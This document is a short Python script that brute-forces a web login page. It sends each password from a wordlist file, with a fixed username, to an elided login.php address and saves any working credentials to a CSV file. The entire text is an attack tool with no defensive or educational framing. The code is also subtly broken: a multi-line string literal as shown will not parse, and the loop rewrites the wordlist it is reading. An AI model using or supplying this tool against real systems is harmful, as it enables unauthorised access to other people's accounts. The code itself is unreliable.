
import sys
import requests

def send_request(target, username, password):
    sys.stdout.write("\r\t\t\t\t\t\t\t")
    sys.stdout.flush()
    sys.stdout.write("\r[!] Testing username and password: " + username + "|" + password)
    sys.stdout.flush()
    try:
        response = requests.post(target, { "username": username, "password": password })
        if response.status_code == 200 and response.json()["result"] == "success":
            sys.stdout.write("\r\t\t\t\t\t\t\t")
            sys.stdout.flush()
            print("\r[+] Login: %s
[+] Password: %s
" % (username, password))
            open("saves.csv", "a").write(username + "," + password + "\n")
    except requests.RequestException:
        sys.stdout.write("\r\t\t\t\t\t\t\t")
        sys.stdout.flush()
        sys.stdout.write("\r[!] An error occurred while sending the request.")
        sys.stdout.flush()

def remove_first_line(filename):
    passwordList = open(filename, "r").readlines()[1:]
    open(filename, "w").writelines(passwordList)

filename = "passwords.txt"
for password in open(filename, "r"):
    send_request("http://.../login.php", "username", password.strip())
    remove_first_line(filename)
